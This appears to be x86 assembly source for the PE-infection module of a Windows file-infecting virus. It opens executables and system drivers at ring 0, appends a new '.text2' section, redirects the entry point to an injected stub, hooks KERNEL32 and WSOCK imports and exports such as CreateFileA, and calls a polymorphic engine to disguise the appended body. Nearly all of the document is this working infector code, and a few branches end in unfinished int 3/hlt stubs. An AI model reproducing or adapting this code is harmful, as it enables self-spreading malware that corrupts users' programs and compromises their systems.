; Module: INFPE
;
; input:    al = INF_NT_EXE/INF_NT_SYS
;          edx = name
;
; returns: eax = 1 if ok
;

;
; Odteraz bude mat infectPE 3 fazy
; - process file imports
; - process file exports
; - add new imports


                include header.inc

common_data     segment public byte USE32 'COMMON'
MAXNAMES = 768
buffer          db 200h dup (?)
pe_header       db 400h dup (?)
overlaybuf      db 200h dup (?)
exps            dd MAXNAMES dup (?)
common_data     ends

indep_mod       segment public byte USE32 'CODE'

                moddef <PACKABLE_MODULE>



; buffer  allocation
;
;   0  ... 200h      buffer
; 200h ... 600h      pe_header
; 600h ... 800h      overlay



readfile macro off, len, buf
         mov   eax, off
         mov   ecx, len
         lea   edx, buf
         call  pe_rdfile
         endm

writefile macro off, len, buf
         mov   eax, off
         mov   ecx, len
         lea   edx, buf
         call  pe_wrfile
         endm

; this function fails or infects vxd file
; if file can't be infected, it shouldn't be damaged
; except one of write fails
infectPE:
        cld
        mov    pe_resume_esp, esp
        mov    relo_table_ptr, 0
        mov    inf_mode, al

        ; do init stuff
        mov    eax, MEMORY2ALLOCATE
        mov    RawLen, eax
        mov    VirtualLen, eax

        mov    eax, Ring0_FileIO
        mov    DirectRing0_FileIO, eax

        ; open vxd file

        mov    pe_seek, 0
        mov    pe_objectr, 0
        mov    rvamode, 0       ; turn off rva translating

        mov    eax, R0_OPENCREATFILE
        mov    esi, edx
        mov    dx, 1                            ; open file if exists
        mov    bx, 2
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO
        jc     pe_cant_open

        mov    pe_handle, eax
        mov    ebx, eax

        ; query for file length and set it to vxd loader
        mov    eax, R0_GETFILESIZE
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO
        mov    dword ptr pe_fileptr, eax

        ; read pointer to PE header
        readfile 3ch 4 pe_objectr

        mov      eax, pe_objectr
        mov      pe_seek, eax

        ; read pe header
        readfile 0 400h pe_header

        ; check 4 signature
        cmp    dword ptr pe_header, 'EP'
        jne    pe_nope

        ; do some other checks
        cmp    word ptr [pe_header+14h], 0e0h        ; check size of optional header
        jne    pe_nope

        cmp    word ptr [pe_header+4], 14ch          ; check machine (=i386)
        jne    pe_nope

        cmp    word ptr [pe_header+6], 10
        ja     pe_nope

        ; check if infected
        movzx  eax, word ptr [pe_header+6]
        dec    eax
        mov    ebx, SECTSIZE
        imul   eax, ebx
        lea    esi, [pe_header+SECT_AREA+eax]

        lea    edi, newsect
        cmpsd
        jne    short noteq
        cmpsd
        jne    short noteq2
        jmp    pe_just_infected
noteq:
        add    esi, 4
noteq2:

        ; get end of file
        mov    edx, dword ptr [esi-8+10h]
        add    edx, dword ptr [esi-8+14h]
        mov    phys_base, edx

        sub    edx, pe_fileptr
        cmp    edx, -200h
        jl     pe_nope   ; !! too big "overlay"

        ; get overlay size and read it
        neg    edx
        mov    overlay_size, edx
        mov    eax, phys_base
        sub    eax, pe_objectr
        readfile eax edx <OVERLAYBUF>

        ; check if we are able to add new section
        add    esi, 2*SECTSIZE-8
        sub    esi, offset cs:pe_header
        cmp    esi, dword ptr [pe_header+54h]
        jnb    pe_nope         ; too short header

        ; turn on rva translating
        mov    rvamode, 1

        movzx  eax, inf_mode
        mov    ebp, import_list[eax*4]
        call   pe_process_import_table
        or     eax, eax
        jz     pe_nope

        movzx  eax, inf_mode
        mov    ebp, export_list[eax*4]
        call   pe_process_export_table
        or     eax, eax
        jz     pe_nope


        call   pe_parse_relo_table

pe_stub_rva = dword ptr [pe_header+28h]
        mov    eax, pe_stub_rva
        mov    pe_disp_ptr, eax

        mov    eax, dword ptr [pe_header+50h]
        mov    NNBase, eax
        mov    pe_base, eax
        mov    pe_stub_rva, eax   ; set entry

        ; relocate jmp 2 entry
;        sub    pe_disp_ptr, eax
        sub    pe_disp_ptr, pe_very_next_label - pe_new_ctrl

        mov    eax, MEMORY2ALLOCATE

        cld
        movzx  eax, word ptr [pe_header+6]
        inc    word ptr [pe_header+6]
        mov    ebx, SECTSIZE
        imul   eax, ebx
        lea    edi, [pe_header+eax+SECT_AREA]
        lea    esi, newsect
        mov    ecx, SECTSIZE/4

        ; push ptr to RawLen
        lea    eax, [edi+RawLen-newsect]
        push   eax

        rep    movsd


        ; save loader
        mov    Ring0_FileIO, offset cs:InternalFileIO

        mov    eax, pe_stub_rva
        mov    edx, pe_stub_rva
        mov    ebx, edx
        add    ebx, MEMORY2ALLOCATE
        mov    esi, relo_table_ptr

        movzx  eax, inf_mode

        mov    edi, fixupp_list[eax*4]

        mov    eax, POLY_STD
        mod_call md_poly
        mov    pe_stub_rva, eax

        mov    eax, DirectRing0_FileIO
        mov    Ring0_FileIO, eax

;        writefile  <pe_stub_rva> pe_disp_len pe_new_ctrl


        ; update header
        mov    eax, last_written
        add    eax, 01ffh
        and    eax, not 01ffh

        pop    esi              ; pop ptr to new rawlen
;        int 3
        sub    eax, NNBase
        mov    dword ptr [esi], eax
        mov    RawLen, eax

        ; recompute image size
;        mov    eax, RawLen
        ; groove data size
        add    dword ptr [pe_header+20h], eax

        ; patch image size
        mov    eax, VirtualLen
        add    eax, 0fffh
        and    eax, not 0fffh
        add    dword ptr [pe_header+50h], eax


        ; turn off rva translating
        mov    rvamode, 0

        ; save updated header
        mov    pe_objectr, 0 ; relative 2 0
        writefile  pe_seek 400h pe_header

        ; append dropper to end of file
        mov   pe_objectr, 0  ; relative 2 0

        mov    eax, R0_GETFILESIZE
        mov    ebx, pe_handle
        call   Ring0_FileIO

        ; align and append overlay
        add    eax, 1ffh
        and    eax, not 1ffh
        writefile eax overlay_size <OVERLAYBUF>

        marker 'PE-CLOSE'


        mov    eax, R0_CLOSEFILE
        mov    ebx, pe_handle
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        cmp    relo_table_ptr, 0
        je     skip_free
        mov    eax, -1
        mod_call md_alloc       ; free relo table
skip_free:

        mov    eax, 1
        ret

pe_cant_infect_2:
pe_cant_find_fixupp:
        add    esp, 4   ; pe_objectr
        jmp    short pe_nope

pe_cant_infect_1:
        add    esp, 8   ; eax, pe_objectr
        jmp    short pe_nope

pe_nope:
pe_just_infected:
        RAISE_X INF_FILE_FATAL

        mov    eax, R0_CLOSEFILE
        mov    ebx, pe_handle
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        cmp    relo_table_ptr, 0
        je     skip_free2
        mov    eax, -1
        mod_call md_alloc       ; free relo table
skip_free2:


        mov    esp, pe_resume_esp
        xor    eax, eax
pe_cant_open:
        ret



; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
; process NT sys file (add new imports)
no_nt_exe:
; compute import table len
        or     eax, eax
        jz     pe_nope
        js     pe_nope


        readfile eax 200 overlaybuf     ; use overlay buf as temp storage

        xor    esi, esi
try_next_one:
        cmp    dword ptr overlaybuf[esi], 0
        je     end_of_table_found
        add    esi, 14h
        cmp    esi, 200h-14h
        jb     try_next_one
        jmp    pe_nope

end_of_table_found:
        mov    import_desc_len, esi
        int 3
        int 3
        int 3
        int 3
        int 3
        int 3
        int 3
        hlt


comment %
; relocate NT loader ====----=============---==-------------------
; edx = base
relocate_nt:
        lea    esi, all_table1
next_ttm1:
        lodsd
        or     eax, eax
        jz     relo1_done
        add    dword ptr ds:[esi-4], edx
        jmp    next_ttm1
relo1_done:
        lea    esi, all_table2
next_ttm2:
        lodsd
        or     eax, eax
        jz     relo2_done
        add    dword ptr ds:[esi-4], edx
        jmp    next_ttm2
relo2_done:
        add    ptr_names, edx
        add    ptr_modnm, edx
        add    ptr_memrefs, edx
        ret
%


; ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออธ

RELO_TABLE_SIZE = 16384
RELO_TABLE_BLOCK_SIZE = 5       ; 2^5 bytes for block

SECTION_DESC          struc
sect_name             db 8 dup (?)
sect_virtual_size     dd ?
sect_virtual_addr     dd ?
sect_size_of_raw_data dd ?
sect_ptr_raw_data     dd ?
sect_ptr_relocations  dd ?
sect_ptr_line_nums    dd ?
sect_cnt_relos        dw ?
sect_cnt_line_nums    dw ?
sect_characteristics  dd ?
                      ends

; parse relo table and find free holes for poly engine

; create memory map for poly engine
; assume: buffer is free
;
pe_parse_relo_table proc near

        mov      eax, RELO_TABLE_SIZE/8
        mod_call md_alloc
        mov      relo_table_ptr, eax

        ; make whole area unusable
        mov      edi, eax
        push     edi

        xor      eax, eax
        dec      eax
        mov      ecx, RELO_TABLE_SIZE/8/4
        rep      stosd

        pop      edi


        ; examine section area for some sections
        lea      esi, [pe_header+SECT_AREA]

go_for_next_sect:
        cmp      dword ptr [esi], 0
        je       first_step_done

        cmp      dword ptr [esi], 'tad.'
        je       alloc_section

        cmp      dword ptr [esi], 'xet.'
        jne      process_next_section

alloc_section:
        or       dword ptr SECTION_DESC[esi].sect_characteristics, 80000000h   ; make writeable
        mov      eax, SECTION_DESC[esi].sect_virtual_addr
        mov      ecx, SECTION_DESC[esi].sect_size_of_raw_data
        add      ecx, eax

        cmp      eax, RELO_TABLE_SIZE shl RELO_TABLE_BLOCK_SIZE
        ja       process_next_section     ; over our table

        cmp      ecx, RELO_TABLE_SIZE shl RELO_TABLE_BLOCK_SIZE
        ja       set_high                 ; fit into table
        mov      ecx, RELO_TABLE_SIZE shl RELO_TABLE_BLOCK_SIZE
set_high:

        ; zero out section region
        add      eax, (1 shl RELO_TABLE_BLOCK_SIZE)-1
        shr      eax, RELO_TABLE_BLOCK_SIZE
        shr      ecx, RELO_TABLE_BLOCK_SIZE

loop_it:
        cmp      eax, ecx
        jae      process_relos

        btc      dword ptr [edi], eax
        inc      eax
        jmp      loop_it

process_relos:
        mov      eax, SECTION_DESC[esi].sect_ptr_relocations
        or       eax, eax
        jz       process_next_section   ; no relocation - ok
        movzx    ecx, SECTION_DESC[esi].sect_cnt_relos
        int 3
        int 3
        hlt      ; not available yet

process_next_section:
        add      esi, size SECTION_DESC
        jmp      go_for_next_sect
first_step_done:
        ; now parse relocation table
        test     byte ptr [pe_header+16h], 1
        jnz      relo_stripped
        mov      eax, 5
        call     pe_assume_dir   ; assume relo table

        lea      esi, buffer
        xor      ecx, ecx

parse_next_buffer:
        push     ecx
        readfile eax 100h buffer
        pop      ecx

        push     eax
        xor      eax, eax
examine_buffer:
        or       ecx, ecx
        jnz      do_not_read_header
        lodsd
        or       eax, eax
        jz       buffer_parsed

        xchg     ebx, eax       ; ebx <= virtual base
        lodsd
        xchg     ecx, eax       ; ecx <= table len

        sub      ecx, 8
        shr      ecx, 1

        xor      eax, eax
do_not_read_header:

        lodsw
        or       eax, eax
        je       end_of_relo_chunk

        and      eax, 0fffh

        lea      edx, [eax+ebx]
        cmp      edx, RELO_TABLE_SIZE shl RELO_TABLE_BLOCK_SIZE
        ja       over_table
        shr      edx, RELO_TABLE_BLOCK_SIZE
        bts      dword ptr [edi], edx
over_table:

        dec      ecx
        cmp      esi, offset cs:buffer+0f0h
        jbe      examine_buffer
        pop      eax
        add      eax, 0f0h
        sub      esi, 0f0h
        jmp      parse_next_buffer

buffer_parsed:
        pop      eax
relo_stripped:
        ret
end_of_relo_chunk:
        mov      ecx, 1
        jmp      over_table

pe_parse_relo_table endp

FILE_BASE = 400000h


; ===================================================================
; === processing fxs ================================================
; ===================================================================

cmp_token proc near
        push eax esi edi

        sub  edi, esi
        dec  edi

test_next_byte:
        lodsb
        cmp  al, 'a'
        jb   skipnorm
        cmp  al, 'z'
        ja   skipnorm
        add  al, 'A'-'a'
skipnorm:
        mov  ah, ds:[edi+esi]
        cmp  ax, '.'
        je   is_eq
        or   ax, ax
        jz   is_eq

        cmp  ah, al
        jne  is_eq
        jmp  test_next_byte
is_eq:
        pop  edi esi eax
        ret
cmp_token endp

; finds end of es:edi
skip_str proc near
         push ecx
         mov  al, 0
         mov  ecx, -1
         repne scasb
         pop  ecx
         ret
skip_str endp

; check import for known procs
; buffer+100h points to name
; edi points to name list
; ebp store ptr
; edx imp/exp table

check_relo:
        pushad

        xor    ebx, ebx
        lea    esi, [buffer+100h]

        ; process whole pe_imports list for each name
        ; assume esi = name
match_next:
        cmp    byte ptr ds:[edi], 0
        je     end_of_list_no_match

        call   cmp_token
        jz     new_imp

        call   skip_str
        inc    ebx
        jmp    match_next

end_of_list_no_match:
        popad
        ret
new_imp:; matches, save pointer
        mov    dword ptr [edx+ebx*4], ebp
        popad
        ret

include export.inc
include import.inc


; hook some exports
pe_process_export_table proc near

        ; init export table
        lea    edi, pe_exps
        xor    eax, eax
        mov    ecx, [EXPORT_REQ ptr ebp].exp_cnt
        or     ecx, ecx
        jz     pe_exp_ok

        mov    temp_ecx, ecx
        rep    stosd            ; init export table

        ; find import section in directory
        mov    eax, 0
        call   pe_assume_dir
        or     eax, eax
        jz     pe_exp_nope

        readfile eax <size _IMAGE_EXPORT_DIRECTORY> buffer
        mov    ecx, [_IMAGE_EXPORT_DIRECTORY ptr buffer].NumberOfNames
        jecxz  pe_exp_nope


        cmp    ecx, MAXNAMES
        jb     NOTX
        mov    ecx, MAXNAMES-1
NOTX:
        lea    ebx, [ecx*4]

        mov    edi, [EXPORT_REQ ptr ebp].exp_list

        mov    eax, [_IMAGE_EXPORT_DIRECTORY ptr buffer].AddressOfNames
        mov    ebp, [_IMAGE_EXPORT_DIRECTORY ptr buffer].AddressOfFunctions
        mov    FunctionTable, ebp
        mov    ebp, [_IMAGE_EXPORT_DIRECTORY ptr buffer].AddressOfNameOrds

        push   ecx
        readfile eax ebx exps
        pop    ecx

        lea    esi, exps

process_next_export:
        lodsd                   ; get ptr to name

        push ecx
        readfile eax 64 buffer+100h   ; read name
        pop  ecx

        lea    edx, pe_exps

        call   check_relo             ; check if in our tables

        add    ebp, 2                 ; next fx
        loop   process_next_export

done_exp:
        lea    edi, pe_exps
        xor    eax, eax
        mov    ecx, temp_ecx
        repne  scasd
        jz     pe_exp_nope        ; not enough exports found ...
pe_exp_ok:
        mov    eax, 1
        ret
pe_exp_nope:
        xor    eax, eax
        ret


        ret
pe_process_export_table endp

; redirect function pointer into our body and create jump to original
; function entry
;
; ebx = rva base of loader
pe_process_hooked_exports proc near
        pushad
        lea    esi, pe_exps
        lea    edi, pe_exp_area[1]
        lea    ebp, pe_new_ctrl
        sub    ebp, ebx
        sub    edi, ebp

loop_next_fx:
        lodsd
        or     eax, eax
        jz     invalid_fx

        ; get export no thru ordinal table
        readfile eax 2 temp_ecx
        movzx  eax, word ptr temp_ecx
        shl    eax, 2
        add    eax, FunctionTable

        push   eax
        ; read file pointer
        readfile eax 4 <dword ptr ds:[ebp+edi]>
        sub    dword ptr ds:[ebp+edi], edi
        sub    dword ptr ds:[ebp+edi], 4
        pop    eax
        dec    edi
        mov    temp_ecx, edi
        writefile eax 4 temp_ecx

        add    edi, 6
        jmp    loop_next_fx
invalid_fx:
        popad
        ret
pe_process_hooked_exports endp



; hook some imports
;
pe_process_import_table proc near

        ; init import table
        mov    edi, [IMPORT_REQ ptr ebp].pe_imps
        mov    ecx, [IMPORT_REQ ptr ebp].imp_req_cnt
        mov    eax, [IMPORT_REQ ptr ebp].imp_req_uni
        mov    temp_ecx, ecx
        mov    temp_ebx, eax
        add    ecx, eax
        add    ecx, [IMPORT_REQ ptr ebp].imp_optional
        or     ecx, ecx
        jz     pe_imp_ok

        xor    eax, eax
        rep    stosd            ; init import table

        ; find import section in directory
        mov    eax, 1
        call   pe_assume_dir
        or     eax, eax
        jz     short done

        ; find kernel32 import table (eax = rva to descriptor)
        ; load descriptor
find_correct_module:
        readfile eax <size _IMAGE_IMPORT_DESCRIPTOR> buffer       ; read descriptor

        ; end of descriptor list?
        mov    ebx, [_IMAGE_IMPORT_DESCRIPTOR ptr buffer].Characteristics
        or     ebx, ebx
        jz     done

        push   eax
        readfile <[_IMAGE_IMPORT_DESCRIPTOR ptr buffer].ModName> 64 <[buffer+100h]>
        pop    eax

        lea    esi, [buffer+100h]
        mov    edi, [IMPORT_REQ ptr ebp].imp_module
        call   cmp_token
        je     short correct_module_found

tryotherdesc:
        add    eax, size _IMAGE_IMPORT_DESCRIPTOR
        jmp    short find_correct_module

done:   jmp    pe_imp_nope

correct_module_found:
        ; get pointer to _IMAGE_THUNK_DATA

        mov    edi, [IMPORT_REQ ptr ebp].imp_list
        mov    edx, [IMPORT_REQ ptr ebp].pe_imps
        mov    temp_edx, edx

        mov    edx, [_IMAGE_IMPORT_DESCRIPTOR ptr buffer].OriginalFirstThunk
        mov    ebp, [_IMAGE_IMPORT_DESCRIPTOR ptr buffer].FirstThunk

        ; find relocs
        lea    esi, exps
        mov    dword ptr exps+MAXNAMES*4-4, 0
        readfile edx <MAXNAMES*4-4> exps

process_next_import:
        lodsd
        or     eax, eax
        jz     done_imp
        test   eax, 80000000h
        jnz    short ordimport

        ; read name
        readfile eax 64 <buffer+100h-2>         ; Hint = 2 bytes

        ; compare name
        mov    edx, temp_edx
        call   check_relo

ordimport:
        add    ebp, 4
        jmp    short process_next_import

done_imp:
        mov    edi, temp_edx
        xor    eax, eax
        mov    ecx, temp_ecx
        repne  scasd
        jz     pe_imp_nope        ; not enough imports found ...


        mov    ecx, temp_ebx
llppl:
        scasd
        jnz    find1
        scasd
        jnz    pe_imp_nope
        loop   llppl
        jmp    pe_exp_ok
find1:
        scasd
        loop   llppl

pe_imp_ok:
        mov    eax, 1
        ret
pe_imp_nope:
        xor    eax, eax
        ret

pe_process_import_table endp


BASIC_HDR_SIZE = 18h
SECT_AREA = 0f8h

; this will assume a directory (read and write will be relative to this)
; assume directory   eax - directory num
; don't move
pe_assume_dir:
        mov    eax, dword ptr pe_header[60h+BASIC_HDR_SIZE+8*eax]
        ret
pe_assume_rva:
        pushad
        lea    esi, dword ptr [pe_header+SECT_AREA]; start of section area
        ; scan each section and find the correct section
trynext:
        mov    ebx, dword ptr [esi+0ch]       ; section start
        cmp    eax, ebx
        jb     short pe_cant_find
        add    ebx, dword ptr [esi+8h]        ; section size
        cmp    eax, ebx
        jb     short match

        add    esi, 28h
        cmp    dword ptr [esi], 0             ; check if valid name
        jne    short trynext
        jmp    short pe_cant_find

match:
        mov    last_section, esi
        sub    eax, [esi+0ch]                 ; sub virtual base
        add    eax, [esi+14h]                 ; get rva base
        mov    pe_objectr, eax
        popad
        ret

pe_cant_find:
        xor    eax, eax
        mov    esp, pe_resume_esp
        ret



; this will assume object eax (read and write will be relative to this)
; eax - object num
pe_assume_object:
        ; relative 2 0
        shl   eax, 3
        mov   ebx, eax
        shl   eax, 2
        add   eax, ebx

        mov   eax, dword ptr [pe_header+eax+1ch]
        mov   pe_objectr, eax
        ret




; eax = ptr

setptr:
         cmp    rvamode, 0
         jne    translate_rva
         add    eax, pe_objectr
         ret

translate_rva:
         call   pe_assume_rva
         mov    eax, pe_objectr
         ret

; eax - ptr
; ecx - len
; edx - buf
; this will read from file at file offset eax ecx bytes to buffer [edx]
pe_rdfile:
         pushad

         call    setptr
         mov     esi, edx
         mov     edx, eax
         mov     eax, R0_READFILE                ; - write sector to disk
         mov     ebx, pe_handle
         call    dword ptr DirectRing0_FileIO    ; VxDCall IFSMgr_Ring0_FileIO

         popad
         ret

; eax - ptr
; ecx - len
; edx - buf
; this will write to file at file offset eax ecx bytes from buffer [edx]
pe_wrfile:
         pushad

         call    setptr
         mov     esi, edx
         mov     edx, eax
         mov     eax, R0_WRITEFILE               ; - write sector to disk
         mov     ebx, pe_handle
         call    dword ptr DirectRing0_FileIO    ; VxDCall IFSMgr_Ring0_FileIO

         popad
         ret


InternalFileIO:                                  ; internal file IO
         cmp     eax, R0_READFILE
         je      do_rd_file
         cmp     eax, R0_WRITEFILE
         je      do_wr_file
         ret
do_rd_file:
         xchg    eax, edx
         xchg    edx, esi
         call    pe_rdfile
         xchg    eax, edx
         xchg    edx, esi
         mov     eax, ecx
         ret
do_wr_file:
         xchg    eax, edx
         xchg    edx, esi
         call    pe_wrfile
         xchg    edx, esi
         xchg    eax, edx
         mov     eax, ecx
         add     eax, edx
         cmp     last_written, eax
         jae     not_last
         mov     last_written, eax
not_last:
         mov     eax, ecx
         ret

fixupp_ldrEXE:
         push    eax
         mov     al, md_initPE
doraz_to:
         push    pe_base
         pop     expe_base
         sub     pe_disp_ptr, ebx
         lea     esi, pe_new_ctrl
         mov     ecx, pe_disp_len
         mov     pe_module_no, al
         pop     eax
         ret
fixupp_ldrSYS:
         mov     al, md_initSYS
         jmp     doraz_to
fixupp_ldrKRNL:
         call    pe_process_hooked_exports
         push    eax
         mov     al, md_initKRNL
         jmp     doraz_to
         ret
fixupp_ldrWSOCK:
         call    pe_process_hooked_exports
         push    eax
         mov     al, md_initWSOCK
         jmp     doraz_to
         ret

; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู


inf_mode           db INF_NT_EXE; infection mode
DirectRing0_FileIO dd 0         ; direct Ring0_IO
last_written       dd 0         ; last modified byte

import_desc_len dd 0            ; length of import description table

newsect      db '.text2',0,0    ; name
VirtualLen   dd 10000h          ; virtual size
NNBase       dd 60000h          ; virtual base
RawLen       dd -1              ; size of raw data (BODYLEN+pe_disp_len)
phys_base    dd ?               ; physical base
             dd 0               ; ptr 2 relocations
             dd 0               ; ptr 2 line num
             dw 0               ; relo cnt
             dw 0               ; lines cnt
             dd 0e0000040h      ; characteristics 0c0000040h
sectsize = $-newsect

pe_fileptr   dd ?               ; file size
overlay_size dd ?               ; overlay size

pe_resume_esp dd 0


rvamode      db 0               ; rva translating state

pe_seek      dd 0               ; le header offset
pe_objectr   dd 0               ; relative object offset

pe_handle    dd ?

last_section dd ?               ; ptr to last section

relo_table_ptr dd ?             ; ptr to relo distribution table

FunctionTable  dd ?             ; ptr to function ptr table

temp_edx       dd ?
temp_ecx       dd ?
temp_ebx       dd ?

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; request description
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; definitions

MAX_IMPS        = 10
MAX_EXPS        = 10

; import request
import_req      struc
imp_req_cnt     dd ?
imp_req_uni     dd ?
imp_optional    dd ?
imp_list        dd ?
imp_module      dd ?
pe_imps         dd ?
                ends

; export request
export_req      struc
exp_cnt         dd ?
exp_list        dd ?
export_req      ends

NULL_IMP        import_req <0,0,0,0,0>
NULL_EXP        export_req <0,0>

; infection lists
import_list  dd cs:exe_imp
             dd cs:sys_imp
             dd cs:NULL_IMP
             dd cs:exe_imp

export_list  dd cs:NULL_EXP
             dd cs:NULL_EXP
             dd cs:krnl_exp
             dd cs:wsock_exp

fixupp_list  dd cs:fixupp_ldrEXE
             dd cs:fixupp_ldrSYS
             dd cs:fixupp_ldrKRNL
             dd cs:fixupp_ldrWSOCK



; PE file info
pe_base         dd  0
pe_exps         dd  MAX_EXPS dup (?)

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this ctrl proc will be added to win PE file
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; definitions

; std exe request
exe_imp         import_req <1,1,2,offset cs:pe_imports,offset cs:pe_module,offset cs:pe_relocs>

MAX_IMPORTS = 8
MAX_EXPORTS = 5*8
NUM_RELOCS = 2
OPTIONAL   = 2
pe_module    db 'KERNEL32', 0

pe_imports   db 'GETPROCADDRESS',0
             db 'GETMODULEHANDLEA',0
             db 'GETMODULEHANDLEW',0
             db 'CREATEFILEA', 0
             db 'CLOSEHANDLE', 0
             db 0

          nosmart
          nojumps

pe_new_ctrl:
               pushad
               call pe_verynext
pe_verynext:
               pop  ebp
               cmp  byte ptr [just_running-pe_verynext+ebp], 0
               jne  short aargh

               mov  byte ptr [just_running-pe_verynext+ebp], 1

               lea  eax, [ebp+pe_new_ctrl-pe_verynext]
               sub  eax, [expe_base-pe_verynext+ebp]

               lea  esi, [pe_relocs-pe_verynext+ebp]
               mov  ecx, NUM_RELOCS+OPTIONAL

fixuppnext:
               cmp  dword ptr ds:[esi], 0
               je   short nofixup
               add  dword ptr ds:[esi], eax
nofixup:
               add  esi, 4
               loop short fixuppnext

               xor  eax, eax
               db   0b0h
pe_module_no   db   ?
               lea  ebx, [pe_relocs-pe_verynext+ebp]
               lea  edx, [pe_exp_area-pe_verynext+ebp]
               call near ptr pe_real_ctrl_end
aargh:
               popad
               db  0e9h      ; jmp to original control dispatcher
pe_disp_ptr    dd  ?
pe_very_next_label label byte   ; don't move

; KERNEL32       db 'KERNEL32',0

just_running   db  0
expe_base      dd  0
pe_relocs      dd  MAX_IMPORTS dup (?)
pe_exp_area    db  MAX_EXPORTS dup (0e9h)

               db 'STRIP HERE>>>'

pe_real_ctrl_end  label byte  ; end of control dispatcher
pe_disp_len = $-pe_new_ctrl



; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this ctrl proc will be added to win SYS file
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; definitions

sys_imp      import_req <1,0, offset cs:sys_module, offset cs:sys_imports>

sys_module   db 'NTOSKRNL', 0

sys_imports  db 'IOCREATEDEVICE',0
             db 0


; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; this ctrl proc will be added to win KERNEL32 file
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; definitions


krnl_exp     export_req <2,cs:pe_exports>

pe_exports   db 'CREATEFILEA',0
             db 'CLOSEHANDLE',0,0


wsock_exp   export_req <1,cs:ws_exports>

ws_exports   db 'SHELLABOUTA',0,0


indep_mod       ends

                end

